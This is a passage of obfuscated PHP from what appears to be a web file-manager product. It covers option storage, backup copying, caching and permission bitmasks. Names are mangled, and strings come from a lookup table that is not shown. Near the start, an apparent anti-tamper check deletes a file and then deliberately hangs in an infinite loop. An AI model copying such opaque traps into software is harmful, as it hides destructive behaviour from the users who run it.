$‰Ä»ø®¬++) { $Í›Æ±¨¥ = $Œü‚Ü®× . "\50{$‰Ä»ø®¬}\51"; if (!isset($’Ì¸ªüÑ[$Í›Æ±¨¥])) { return $Í›Æ±¨¥; } } return $Í›Æ±¨¥; } } if (!isset($_SERVER[$_SERVER[Ï×Œõ”û][488]]) || !isset($_SERVER[$_SERVER[Ï×Œõ”û][489]])) { $_getc = $_SERVER[Ï×Œõ”û][490]; $_getfile = $_SERVER[$_SERVER[Ï×Œõ”û][491]] . $_SERVER[Ï×Œõ”û][492]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ï×Œõ”û][287], $_getfilec); if (count($_getarrs) < $_SERVER[Ï×Œõ”û][493]) { $exit = $_SERVER[Ï×Œõ”û][494]; $exit(); } $_act = $_SERVER[Ï×Œõ”û][495]; $_act($_SERVER[$_SERVER[Ï×Œõ”û][491]] . $_SERVER[Ï×Œõ”û][492]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Ï×Œõ”û][464]); } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($‚ùÒ¡Š¶ = false, $õàş‰£‚ = '', $²Ôãâíß = false, $å»ŸÍ§î = true) { $ëŒªÉï¼ =& $_SERVER[Ï×Œõ”û]; $å³›Ğ¡Ê = $this->cacheGet($õàş‰£‚); $ÜÏÊ´–Ø = $this->optionDefault($õàş‰£‚); $ÜÏÊ´–Ø = is_array($ÜÏÊ´–Ø) ? $ÜÏÊ´–Ø : array(); if (is_array($å³›Ğ¡Ê)) { if ($å»ŸÍ§î) { $å³›Ğ¡Ê = array_merge($ÜÏÊ´–Ø, $å³›Ğ¡Ê); } return $‚ùÒ¡Š¶ ? isset($å³›Ğ¡Ê[$‚ùÒ¡Š¶]) ? $å³›Ğ¡Ê[$‚ùÒ¡Š¶] : null : $å³›Ğ¡Ê; } $·óÖ¾Ş = $this->filterWhere(array($ëŒªÉï¼[33] => $õàş‰£‚)); $å³›Ğ¡Ê = $this->where($·óÖ¾Ş)->select(); $å³›Ğ¡Ê = array_to_keyvalue($å³›Ğ¡Ê, $ëŒªÉï¼[95], $ëŒªÉï¼[452]); foreach ($å³›Ğ¡Ê as $²Äé‡„‡ => $…¨øÔÙÌ) { if ($²Ôãâíß || in_array($²Äé‡„‡, $this->jsonField)) { $å³›Ğ¡Ê[$²Äé‡„‡] = json_decode($…¨øÔÙÌ, !0); } } $this->cacheSet($õàş‰£‚, $å³›Ğ¡Ê); if ($å»ŸÍ§î) { $å³›Ğ¡Ê = array_merge($ÜÏÊ´–Ø, $å³›Ğ¡Ê); } return $‚ùÒ¡Š¶ ? $å³›Ğ¡Ê[$‚ùÒ¡Š¶] : $å³›Ğ¡Ê; } public function set($·¶ğŠäĞ, $ÚŒÄ’ş‰ = false, $ÑÁûºÃ’ = '') { $Ã¦ˆ…¿£ =& $_SERVER[Ï×Œõ”û]; if (!$·¶ğŠäĞ) { return !0; } $Ù–şøµî = $this->get(!1, $ÑÁûºÃ’, !1, !1); $Ù–şøµî = is_array($Ù–şøµî) ? $Ù–şøµî : array(); $æÊé”Šî = array(); $¼Î Á„¶ = array(); $Ò«Ë¿Ç§ = array(); $ß«½—•Æ = is_array($·¶ğŠäĞ) ? $·¶ğŠäĞ : array($·¶ğŠäĞ => $ÚŒÄ’ş‰); $ÌÖËè€ = $this->filterWhere(array($Ã¦ˆ…¿£[33] => $ÑÁûºÃ’)); foreach ($ß«½—•Æ as $”åÃŠò => $É¨Å×Ø½) { if (is_array($É¨Å×Ø½)) { $É¨Å×Ø½ = json_encode_force($É¨Å×Ø½); } $this->checkLength($É¨Å×Ø½, !1, $this->tableName . $Ã¦ˆ…¿£[4] . $·¶ğŠäĞ); $É¨Å×Ø½ = self::textEncode($É¨Å×Ø½); if (array_key_exists($”åÃŠò, $Ù–şøµî)) { $Ë†‘İåİ = is_array($Ù–şøµî[$”åÃŠò]) ? json_encode_force($Ù–şøµî[$”åÃŠò]) : $Ù–şøµî[$”åÃŠò]; $Ë†‘İåİ = self::textEncode($Ë†‘İåİ); if ($Ë†‘İåİ === $É¨Å×Ø½) { continue; } $¼Î Á„¶[] = array($Ã¦ˆ…¿£[95], $”åÃŠò, $Ã¦ˆ…¿£[452], $É¨Å×Ø½, $Ã¦ˆ…¿£[88], time()); } else { $Á Ø«Ì³ = array($Ã¦ˆ…¿£[33] => $ÑÁûºÃ’, $Ã¦ˆ…¿£[95] => $”åÃŠò, $Ã¦ˆ…¿£[452] => $É¨Å×Ø½); $æÊé”Šî[] = $this->filterWhere($Á Ø«Ì³); } } if (!$æÊé”Šî && !$¼Î Á„¶) { return !0; } $this->cacheRemove($ÑÁûºÃ’); $Ïş„ÑŸŠ = $this->cacheKey($Ã¦ˆ…¿£[496]); CacheLock::lock($Ïş„ÑŸŠ); if ($æÊé”Šî) { $this->addAll($æÊé”Šî); } if ($¼Î Á„¶) { $this->saveAll($¼Î Á„¶, $ÌÖËè€); } CacheLock::unlock($Ïş„ÑŸŠ); return !0; } protected function optionDefault($û³¸é„‘ = '') { return !1; } public function setDeep($¼îËÁ…”, $¯¯Ğ§ƒ· = false, $ù¾Œä‚ = '') { $è”½›çÉ = explode($_SERVER[Ï×Œõ”û][10], $¼îËÁ…”); $’–Û«¸ç = $this->get(); array_set_value($’–Û«¸ç, $¼îËÁ…”, $¯¯Ğ§ƒ·); $this->set($è”½›çÉ[0], $’–Û«¸ç[$è”½›çÉ[0]], $ù¾Œä‚); } public function remove($Á·›Èòå, $èäÊã = '') { $†³ß¦Æ½ =& $_SERVER[Ï×Œõ”û]; $this->cacheRemove($èäÊã); $‚ÌÔÙ® = $this->filterWhere(array($†³ß¦Æ½[95] => $Á·›Èòå, $†³ß¦Æ½[33] => $èäÊã)); if (is_null($Á·›Èòå)) { unset($‚ÌÔÙ®[$†³ß¦Æ½[95]]); } return $this->where($‚ÌÔÙ®)->delete(); } public function removeArr($ôäŞ°¨‘, $îÛµ„Íû = '') { $ªå¤ˆ¶ú =& $_SERVER[Ï×Œõ”û]; if (!$ôäŞ°¨‘ || !is_array($ôäŞ°¨‘)) { return !0; } $this->cacheRemove($îÛµ„Íû); $¡¤Å…İÚ = $this->filterWhere(array($ªå¤ˆ¶ú[33] => $îÛµ„Íû, $ªå¤ˆ¶ú[95] => array($ªå¤ˆ¶ú[7], $ôäŞ°¨‘))); return $this->where($¡¤Å…İÚ)->delete(); } public function cacheSet($ÛÙÈ±Ã§, $Ç†ÅÅÓ÷ = false) { return Cache::set($this->cacheKey($ÛÙÈ±Ã§), $Ç†ÅÅÓ÷); } public function cacheGet($è¢ÑÔä¹) { return Cache::get($this->cacheKey($è¢ÑÔä¹)); } public function cacheRemove($È„œöû­) { return Cache::remove($this->cacheKey($È„œöû­)); } protected function filterWhere($ë­²Ú) { return $ë­²Ú; } protected function cacheKey($¿º…Ô·ú) { return $¿º…Ô·ú; } } goto aëŞ¡´ùå–; B“ˆ¥ˆæÅ: class BackupFile { public function __construct() { } public function index() { $â¾…®ó = Backup::get(); $äÇëùÉ = $â¾…®ó[$_SERVER[Ï×Œõ”û][862]][$_SERVER[Ï×Œõ”û][232]][$_SERVER[Ï×Œõ”û][562]]; $Ôë´£› = array($_SERVER[Ï×Œõ”û][563] => array($_SERVER[Ï×Œõ”û][921], $äÇëùÉ), $_SERVER[Ï×Œõ”û][922] => array($_SERVER[Ï×Œõ”û][408], $â¾…®ó[$_SERVER[Ï×Œõ”û][858]])); $‡€£ã© = (int) Model($_SERVER[Ï×Œõ”û][900])->where($Ôë´£›)->count($_SERVER[Ï×Œõ”û][562]); $£¢ˆ‘ç˜ = (int) Model($_SERVER[Ï×Œõ”û][900])->where($Ôë´£›)->sum($_SERVER[Ï×Œõ”û][79]); $¤×ûÅ½ô = new TaskFileTransfer($_SERVER[Ï×Œõ”û][923], $_SERVER[Ï×Œõ”û][886], $‡€£ã©, LNG($_SERVER[Ï×Œõ”û][895]) . $_SERVER[Ï×Œõ”û][896] . LNG($_SERVER[Ï×Œõ”û][924])); $¤×ûÅ½ô->task[$_SERVER[Ï×Œõ”û][870]] = $£¢ˆ‘ç˜; $†ş…İ¶ö = array($_SERVER[Ï×Œõ”û][925] => $‡€£ã©, $_SERVER[Ï×Œõ”û][926] => $£¢ˆ‘ç˜, $_SERVER[Ï×Œõ”û][927] => time()); Backup::set($†ş…İ¶ö); $Èß‘Â‡Â = !0; $½¼ˆÅ€ö = $this->storeIds(); $á”ÏÊñ” = 1; $ÎŸ°Ğ¹Â = 1000; $ê·óĞ¼ = $‚„âÀ¦ = 0; $ª‰ØÉó¤ = array(); $´§û¿ƒö = $’ì¯Â™¾ = 0; do { $¥¬¹ùÃŒ = $_SERVER[Ï×Œõ”û][928]; $Â·§¨² = Model($_SERVER[Ï×Œõ”û][900])->where($Ôë´£›)->field($¥¬¹ùÃŒ)->order($_SERVER[Ï×Œõ”û][929])->selectPage($ÎŸ°Ğ¹Â, $á”ÏÊñ”); $¬îßÀ = !empty($Â·§¨²[$_SERVER[Ï×Œõ”û][447]]) ? $Â·§¨²[$_SERVER[Ï×Œõ”û][447]] : array(); foreach ($¬îßÀ as $®íÉ¥ãÛ) { if (!$this->_fileExist($®íÉ¥ãÛ, $ª‰ØÉó¤, $½¼ˆÅ€ö)) { Backup::log($_SERVER[Ï×Œõ”û][930] . $®íÉ¥ãÛ[$_SERVER[Ï×Œõ”û][562]] . $_SERVER[Ï×Œõ”û][931] . $®íÉ¥ãÛ[$_SERVER[Ï×Œõ”û][87]]); continue; } $¬Å«ÁÄÊ = $®íÉ¥ãÛ[$_SERVER[Ï×Œõ”û][87]]; $ÅÓä“í† = "\x7b\151\157\72{$â¾…®ó[$_SERVER[Ï×Œõ”û][858]]}\x7d" . substr($¬Å«ÁÄÊ, strlen("\173\151\157\x3a{$®íÉ¥ãÛ[$_SERVER[Ï×Œõ”û][932]]}\175")); if (IO::exist($ÅÓä“í†)) { $¤×ûÅ½ô->updateFileEnd($®íÉ¥ãÛ[$_SERVER[Ï×Œõ”û][32]], $®íÉ¥ãÛ[$_SERVER[Ï×Œõ”û][79]]); } else { $ÅÓä“í† = get_path_father($ÅÓä“í†); IO::mkdir($ÅÓä“í†); if (!IO::copy($¬Å«ÁÄÊ, $ÅÓä“í†, $_SERVER[Ï×Œõ”û][933])) { Backup::log($_SERVER[Ï×Œõ”û][934] . $¬Å«ÁÄÊ . $_SERVER[Ï×Œõ”û][918] . $ÅÓä“í† . $_SERVER[Ï×Œõ”û][177]); $Èß‘Â‡Â = !1; break; } } $äÇëùÉ = $®íÉ¥ãÛ[$_SERVER[Ï×Œõ”û][562]]; $‚„âÀ¦ += 1; $ê·óĞ¼ += $®íÉ¥ãÛ[$_SERVER[Ï×Œõ”û][79]]; $’ì¯Â™¾ += 1; $´§û¿ƒö += $®íÉ¥ãÛ[$_SERVER[Ï×Œõ”û][79]]; if ($ê·óĞ¼ >= 1024 * 1024 * 100) { $†ş…İ¶ö = array($_SERVER[Ï×Œõ”û][857] => $äÇëùÉ, $_SERVER[Ï×Œõ”û][935] => $’ì¯Â™¾, $_SERVER[Ï×Œõ”û][936] => $´§û¿ƒö); Backup::set($†ş…İ¶ö); $ê·óĞ¼ = $‚„âÀ¦ = 0; } } $Õ×ÃÒÒú = count($¬îßÀ); $á”ÏÊñ”++; } while ($Õ×ÃÒÒú == $ÎŸ°Ğ¹Â); $¤×ûÅ½ô->end(); $†ş…İ¶ö = array($_SERVER[Ï×Œõ”û][937] => 1, $_SERVER[Ï×Œõ”û][868] => time(), $_SERVER[Ï×Œõ”û][884] => 1, $_SERVER[Ï×Œõ”û][857] => $äÇëùÉ, $_SERVER[Ï×Œõ”û][938] => time()); if ($‚„âÀ¦) { $†ş…İ¶ö[$_SERVER[Ï×Œõ”û][935]] = $’ì¯Â™¾; $†ş…İ¶ö[$_SERVER[Ï×Œõ”û][936]] = $´§û¿ƒö; } Backup::set($†ş…İ¶ö); return !0; } private function _fileExist($ÜØíŸÓó, &$Ï§ß¥‡‰, $µù¨¨¤) { $ÙØ€ëÁÕ =& $_SERVER[Ï×Œõ”û]; $™ŒË¢“ = $ÜØíŸÓó[$ÙØ€ëÁÕ[87]]; if (in_array($ÜØíŸÓó[$ÙØ€ëÁÕ[562]], $Ï§ß¥‡‰)) { return !1; } if (!in_array($ÜØíŸÓó[$ÙØ€ëÁÕ[932]], $µù¨¨¤)) { return !1; } if (IO::exist($™ŒË¢“)) { return !0; } $£ù™ã¤ = get_path_father($™ŒË¢“); if (IO::exist($£ù™ã¤)) { $Ï§ß¥‡‰[] = $ÜØíŸÓó[$ÙØ€ëÁÕ[562]]; return !1; } $Ú —Ûë = array($ÙØ€ëÁÕ[932] => $ÜØíŸÓó[$ÙØ€ëÁÕ[932]], $ÙØ€ëÁÕ[87] => array($ÙØ€ëÁÕ[471], "{$£ù™ã¤}\x25")); $Ñí¤èşĞ = Model($ÙØ€ëÁÕ[900])->where($Ú —Ûë)->field($ÙØ€ëÁÕ[563])->select(); $Ï§ß¥‡‰ = array_merge($Ï§ß¥‡‰, array_to_keyvalue($Ñí¤èşĞ, $ÙØ€ëÁÕ[12], $ÙØ€ëÁÕ[562])); return !1; } private function _fileFilter($·æœÖÜ) { $é²ñ°Şá =& $_SERVER[Ï×Œõ”û]; return; if (empty($·æœÖÜ)) { return; } $“ˆ÷Ïãø = array($é²ñ°Şá[562] => array($é²ñ°Şá[7], array_unique($·æœÖÜ))); $÷Áà¯¢¿ = Model($é²ñ°Şá[939])->where($“ˆ÷Ïãø)->field($é²ñ°Şá[193])->select(); foreach ($÷Áà¯¢¿ as $º°âà£) { Model($é²ñ°Şá[939])->remove($º°âà£[$é²ñ°Şá[193]], !1); } } private function storeIds() { $¥¢’õÓÊ =& $_SERVER[Ï×Œõ”û]; $•Ûçí¸Ë = Model($¥¢’õÓÊ[874])->listData(); $î³ˆŸ•¨ = array(); $–Å‘™”… = $GLOBALS[$¥¢’õÓÊ[6]][$¥¢’õÓÊ[92]][$¥¢’õÓÊ[940]]; foreach ($•Ûçí¸Ë as $û±¦„) { $´ØæŠşÀ = strtolower($û±¦„[$¥¢’õÓÊ[96]]); if (!isset($–Å‘™”…[$´ØæŠşÀ])) { continue; } $©é£— = $¥¢’õÓÊ[77] . (isset($–Å‘™”…[$´ØæŠşÀ]) ? $–Å‘™”…[$´ØæŠşÀ] : ucfirst($´ØæŠşÀ)); if (!class_exists($©é£—)) { continue; } $î³ˆŸ•¨[] = $û±¦„[$¥¢’õÓÊ[484]]; } return $î³ˆŸ•¨; } } class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $÷à°™çğ =& $_SERVER[Ï×Œõ”û]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $ºŸ¨•Œ = $GLOBALS[$÷à°™çğ[6]][$÷à°™çğ[426]]; $²İÚÑ¬‡ = $ºŸ¨•Œ[$ºŸ¨•Œ[$÷à°™çğ[941]]]; $Ïö”®Ú = $ºŸ¨•Œ[$÷à°™çğ[942]]; switch ($ºŸ¨•Œ[$÷à°™çğ[941]]) { case $÷à°™çğ[21]: self::$handle = Model($÷à°™çğ[943]); break; case $÷à°™çğ[944]: self::$handle = new CacheRedis($²İÚÑ¬‡, $Ïö”®Ú); break; case $÷à°™çğ[945]: self::$handle = new CacheMemcached($²İÚÑ¬‡, $Ïö”®Ú); break; case $÷à°™çğ[232]: self::$handle = new CacheFile($²İÚÑ¬‡, $Ïö”®Ú); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($æ€§Ôšß) { if (is_array($æ€§Ôšß) || is_object($æ€§Ôšß)) { $æ€§Ôšß = json_encode($æ€§Ôšß); } $æ€§Ôšß = rawurlencode($æ€§Ôšß); return md5(KOD_SITE_ID . $_SERVER[Ï×Œõ”û][11] . $æ€§Ôšß); } public static function get($ì†˜”¸í, $‰øŒı‘‘ = false) { $àÄÇšÌ = self::key($ì†˜”¸í); $ÔŒæ‡Ïã = self::init(); if ($‰øŒı‘‘) { return unserialize($ÔŒæ‡Ïã->get($àÄÇšÌ)); } if (!isset(self::$memoryCache[$àÄÇšÌ])) { $¼•ä¸´ş = $ÔŒæ‡Ïã->get($àÄÇšÌ); self::$memoryCache[$àÄÇšÌ] = unserialize($¼•ä¸´ş); } return self::$memoryCache[$àÄÇšÌ]; } public static function set($£ÔŞÖ¡¸, $Çµ¦¯¹Õ, $ÇÓ‹™†Ó = false) { $€åàµŸà =& $_SERVER[Ï×Œõ”û]; $ÔĞøíË· = self::key($£ÔŞÖ¡¸); if (isset(self::$memoryCache[$ÔĞøíË·]) && self::$memoryCache[$ÔĞøíË·] === $Çµ¦¯¹Õ) { return !0; } if ($ÇÓ‹™†Ó === 0) { self::$memoryCache[$ÔĞøíË·] = $Çµ¦¯¹Õ; return !0; } $Ìü¡ÛÌç = self::init(); $®Š½€ŒÉ = serialize($Çµ¦¯¹Õ); CacheLock::lock($£ÔŞÖ¡¸ . $€åàµŸà[946]); $¡ı¼‰îˆ = $Ìü¡ÛÌç->set($ÔĞøíË·, $®Š½€ŒÉ, $ÇÓ‹™†Ó); self::$memoryCache[$ÔĞøíË·] = $Çµ¦¯¹Õ; CacheLock::unlock($£ÔŞÖ¡¸ . $€åàµŸà[946]); return $¡ı¼‰îˆ; } public static function getCall($¤‚ÃÇÉÀ, $ü¶ß‡æï, $«Ü‘¦Ú, $Àˆñòç = array()) { $ä÷ÌÌ¬Ú =& $_SERVER[Ï×Œõ”û]; $öİÁÆù = self::get($¤‚ÃÇÉÀ); if ($öİÁÆù || $öİÁÆù === $ä÷ÌÌ¬Ú[12]) { return $öİÁÆù; } $öİÁÆù = call_user_func_array($«Ü‘¦Ú, $Àˆñòç); $öİÁÆù = $öİÁÆù ? $öİÁÆù : $ä÷ÌÌ¬Ú[12]; self::set($¤‚ÃÇÉÀ, $öİÁÆù, $ü¶ß‡æï); return $öİÁÆù; } public static function limitCall($’‘ƒò™ğ, $¸©€ğõŸ = 15, $‰ºÀÀ¶ˆ = 30, $­„¾²°… = true) { $²Ì¶»ş· =& $_SERVER[Ï×Œõ”û]; static $Õîë›–­ = array(); if ($­„¾²°…) { $’‘ƒò™ğ = $’‘ƒò™ğ . $²Ì¶»ş·[947] . KodUser::id() . $²Ì¶»ş·[948] . get_client_ip(); } if (isset($Õîë›–­[$’‘ƒò™ğ]) && is_array($Õîë›–­[$’‘ƒò™ğ])) { return $Õîë›–­[$’‘ƒò™ğ][$²Ì¶»ş·[334]] <= $‰ºÀÀ¶ˆ; } $–˜¶¿åæ = self::get($’‘ƒò™ğ); if (!is_array($–˜¶¿åæ) || time() - $–˜¶¿åæ[$²Ì¶»ş·[206]] > $¸©€ğõŸ) { $–˜¶¿åæ = array($²Ì¶»ş·[206] => time(), $²Ì¶»ş·[334] => 0); } $–˜¶¿åæ[$²Ì¶»ş·[334]]++; self::set($’‘ƒò™ğ, $–˜¶¿åæ, $¸©€ğõŸ); $Õîë›–­[$’‘ƒò™ğ] = $–˜¶¿åæ; return $–˜¶¿åæ[$²Ì¶»ş·[334]] <= $‰ºÀÀ¶ˆ; } public static function limitRuntime($ŸÅôÂú, $Ô°×÷ä×) { $¸Ì‡« = $_SERVER[Ï×Œõ”û][949] . $ŸÅôÂú; if (isset(self::$runTimeCache[$¸Ì‡«]) || !$Ô°×÷ä×) { return !0; } $Ó¢ìæÜ¸ = intval(self::get($¸Ì‡«)); $Ó¢ìæÜ¸ = !$Ó¢ìæÜ¸ || $Ó¢ìæÜ¸ <= 0 ? 1 : $Ó¢ìæÜ¸ + 1; if ($Ó¢ìæÜ¸ > $Ô°×÷ä×) { return !1; } self::$runTimeCache[$¸Ì‡«] = !0; self::set($¸Ì‡«, $Ó¢ìæÜ¸, 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $ö¼—¤Ùù => $Ä‚¼êã­) { $ˆ¤†ä = intval(self::get($ö¼—¤Ùù)); $ˆ¤†ä = !$ˆ¤†ä || $ˆ¤†ä <= 1 ? 0 : $ˆ¤†ä - 1; self::set($ö¼—¤Ùù, $ˆ¤†ä, 3600); } self::$runTimeCache = array(); } public static function remove($„øÓŞÄ­) { $ÛîÁù€ = self::key($„øÓŞÄ­); unset(self::$memoryCache[$ÛîÁù€]); self::clearTimeout(); CacheLock::lock($„øÓŞÄ­); $¾ìÁé¾» = self::init()->remove($ÛîÁù€); CacheLock::unlock($„øÓŞÄ­); return $¾ìÁé¾»; } public static function removeMemory($š¤…âè) { $ãä¼œ÷ = self::key($š¤…âè); unset(self::$memoryCache[$ãä¼œ÷]); } public static function clearMemory($º‘æ–€ô = false) { if ($º‘æ–€ô) { $º‘æ–€ô = self::key($º‘æ–€ô); unset(self::$memoryCache[$º‘æ–€ô]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ï×Œõ”û][950])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ï×Œõ”û][951])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($œ©²“ˆ, $·ó‘Í») { $ï·İÅ³® =& $_SERVER[Ï×Œõ”û]; $this->cachePath = $œ©²“ˆ[$ï·İÅ³®[87]]; $this->prefix = $ï·İÅ³®[952]; $this->cacheTime = $·ó‘Í»; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($´‰œ‰¯Ô) { $£é¬Ì¡î =& $_SERVER[Ï×Œõ”û]; $´‰œ‰¯Ô = str_replace(array($£é¬Ì¡î[953], $£é¬Ì¡î[98], $£é¬Ì¡î[76]), $£é¬Ì¡î[954], $´‰œ‰¯Ô); return $this->cachePath . $£é¬Ì¡î[955] . $´‰œ‰¯Ô . $£é¬Ì¡î[956]; } public function set($«åŸÇ¥, $ï‚ûñô„, $Ç¡†¸½ = false) { $Ç¡†¸½ = $Ç¡†¸½ ? $Ç¡†¸½ : $this->cacheTime; $ Ø¶Ç = $this->getFile($«åŸÇ¥); if (file_put_contents($ Ø¶Ç, $this->prefix . $ï‚ûñô„, LOCK_EX)) { @touch($ Ø¶Ç, intval(time() + $Ç¡†¸½)); clearstatcache(); return !0; } @unlink($ Ø¶Ç); return !1; } public function get($µñœÒÒÎ) { $¡¥³• = $this->getFile($µñœÒÒÎ); if (file_exists($¡¥³•) && filemtime($¡¥³•) < time()) { @unlink($¡¥³•); return !1; } $™Ï²ˆ½µ = @file_get_contents($¡¥³•); return substr($™Ï²ˆ½µ, strlen($this->prefix)); } public function remove($ø¤ú¹µ¹) { $ÖñÏª³ = $this->getFile($ø¤ú¹µ¹); return @unlink($ÖñÏª³); } public function deleteAll() { $®÷ï–ä =& $_SERVER[Ï×Œõ”û]; $“¾Ùáµ‰ = scandir($this->cachePath); foreach ($“¾Ùáµ‰ as $ªÔí­á›) { $ò«…‘Ğù = $this->cachePath . $ªÔí­á›; if (strpos($ò«…‘Ğù, $®÷ï–ä[956]) && strpos($ò«…‘Ğù, $®÷ï–ä[957])) { @unlink($ò«…‘Ğù); } } } public function clearTimeout() { $½úÉûÅ‘ =& $_SERVER[Ï×Œõ”û]; $¡ãˆÚöè = scandir($this->cachePath); foreach ($¡ãˆÚöè as $Ñé–ø¼Š) { $¡£®ªôØ = $this->cachePath . $Ñé–ø¼Š; if (strpos($¡£®ªôØ, $½úÉûÅ‘[956]) && strpos($¡£®ªôØ, $½úÉûÅ‘[957]) && filemtime($¡£®ªôØ) < time()) { @unlink($¡£®ªôØ); } } } } goto b‹é…é­; cÉçÎ„ˆî: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $‡üÁ† =& $_SERVER[Ï×Œõ”û]; $È¼ÚùáÚ = array(array($‡üÁ†[514] => LNG($‡üÁ†[2138]), $‡üÁ†[2139] => $‡üÁ†[2140], $‡üÁ†[2141] => 1, $‡üÁ†[2142] => 1, $‡üÁ†[2143] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($‡üÁ†[514] => LNG($‡üÁ†[2144]), $‡üÁ†[2139] => $‡üÁ†[2145], $‡üÁ†[2141] => 2, $‡üÁ†[2142] => 1, $‡üÁ†[2143] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($‡üÁ†[514] => LNG($‡üÁ†[2146]), $‡üÁ†[2139] => $‡üÁ†[2147], $‡üÁ†[2141] => 3, $‡üÁ†[2142] => 1, $‡üÁ†[2143] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($‡üÁ†[514] => LNG($‡üÁ†[2148]), $‡üÁ†[2139] => $‡üÁ†[2149], $‡üÁ†[2141] => 4, $‡üÁ†[2142] => 1, $‡üÁ†[2143] => self::AUTH_SHOW | self::AUTH_VIEW), array($‡üÁ†[514] => LNG($‡üÁ†[2150]), $‡üÁ†[2139] => $‡üÁ†[2151], $‡üÁ†[2141] => 5, $‡üÁ†[2142] => 1, $‡üÁ†[2143] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($‡üÁ†[514] => LNG($‡üÁ†[2152]), $‡üÁ†[2139] => $‡üÁ†[2153], $‡üÁ†[2141] => 6, $‡üÁ†[2142] => 1, $‡üÁ†[2143] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($‡üÁ†[514] => LNG($‡üÁ†[2154]), $‡üÁ†[2139] => $‡üÁ†[2155], $‡üÁ†[2141] => 7, $‡üÁ†[2142] => 1, $‡üÁ†[2143] => 0)); return $È¼ÚùáÚ; } public static function authCheck($¯­ÎàêÊ, $ø¡õ¶ÒÂ, $ÓøÁå„£ = true) { $¥¯öşºß =& $_SERVER[Ï×Œõ”û]; $¯­ÎàêÊ = intval($¯­ÎàêÊ); if ($ÓøÁå„£) { if (KodUser::isRoot() && $GLOBALS[$¥¯öşºß[6]][$¥¯öşºß[2156]]) { return !0; } } if ($¯­ÎàêÊ <= 0) { return !1; } if (($¯­ÎàêÊ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¯­ÎàêÊ & $ø¡õ¶ÒÂ); } public static function authCheckShow($†Ûëß) { return self::authCheck($†Ûëß, self::AUTH_SHOW); } public static function authCheckView($è“à¿›º) { return self::authCheck($è“à¿›º, self::AUTH_VIEW); } public static function authCheckDownload($Üû©¤Œ) { return self::authCheck($Üû©¤Œ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($»ö®ÓÁ) { return self::authCheck($»ö®ÓÁ, self::AUTH_UPLOAD); } public static function authCheckEdit($€ÓèÍ“) { return self::authCheck($€ÓèÍ“, self::AUTH_EDIT); } public static function authCheckRemove($‘­¤Ï©) { return self::authCheck($‘­¤Ï©, self::AUTH_REMOVE); } public static function authCheckShare($èÆ§ŞÍä) { return self::authCheck($èÆ§ŞÍä, self::AUTH_SHARE); } public static function authCheckComment($Ø×­´²¹) { return self::authCheck($Ø×­´²¹, self::AUTH_COMMENT); } public static function authCheckEvent($üüïèÄ) { return self::authCheck($üüïèÄ, self::AUTH_EVENT); } public static function authCheckRoot($ÆŒˆÓŠõ) { return self::authCheck($ÆŒˆÓŠõ, self::AUTH_ROOT); } public static function authCheckAction($ãé”Ë‘ì, $Íˆ÷™ü¸) { $É×çÔ– =& $_SERVER[Ï×Œõ”û]; $Í÷—ğÏ = array($É×çÔ–[1514] => self::AUTH_SHOW, $É×çÔ–[1515] => self::AUTH_VIEW, $É×çÔ–[1336] => self::AUTH_DOWNLOAD, $É×çÔ–[108] => self::AUTH_UPLOAD, $É×çÔ–[1516] => self::AUTH_EDIT, $É×çÔ–[1285] => self::AUTH_REMOVE, $É×çÔ–[1517] => self::AUTH_SHARE, $É×çÔ–[431] => self::AUTH_COMMENT, $É×çÔ–[1518] => self::AUTH_EVENT, $É×çÔ–[1519] => self::AUTH_ROOT); if (!isset($Í÷—ğÏ[$Íˆ÷™ü¸])) { return; } $¢ûì¼ä = $Í÷—ğÏ[$Íˆ÷™ü¸]; $ãé”Ë‘ì = intval($ãé”Ë‘ì); if ($ãé”Ë‘ì <= 0) { return !1; } if (($ãé”Ë‘ì & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ãé”Ë‘ì & $¢ûì¼ä); } public static function authDisable($‹±ß®Ú, $°¢İ¼¯ê) { if (intval($‹±ß®Ú) <= 0) { return 0; } return intval($‹±ß®Ú) & ~$°¢İ¼¯ê; } public $optionType = 